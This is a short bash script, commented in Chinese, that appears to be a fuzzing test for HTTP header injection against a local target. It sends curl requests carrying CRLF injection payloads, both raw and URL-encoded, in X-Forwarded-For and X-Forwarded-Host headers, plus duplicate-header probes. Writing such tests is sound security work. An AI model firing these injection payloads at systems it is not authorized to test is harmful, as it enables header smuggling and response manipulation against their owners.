#!/bin/bash
# HTTP Header Injection 模糊测试脚本

TARGET="${1:-http://localhost:8080}"
echo "Testing Header Injection against: $TARGET"

# CRLF 注入测试
echo "=== Testing CRLF Injection in X-Forwarded-For ==="
curl -X GET "$TARGET" \
  -H "X-Forwarded-For: 127.0.0.1\r\nX-Injected: test" \
  -v

# 响应头注入测试
echo "=== Testing Response Header Injection ==="
curl -X GET "$TARGET" \
  -H "X-Forwarded-Host: example.com\r\nX-Injected: test" \
  -v

# 多个头部值测试
echo "=== Testing Multiple Header Values ==="
curl -X GET "$TARGET" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Forwarded-For: 192.168.1.1" \
  -v

# 编码绕过测试
echo "=== Testing Encoded CRLF ==="
curl -X GET "$TARGET" \
  -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Injected: test" \
  -v


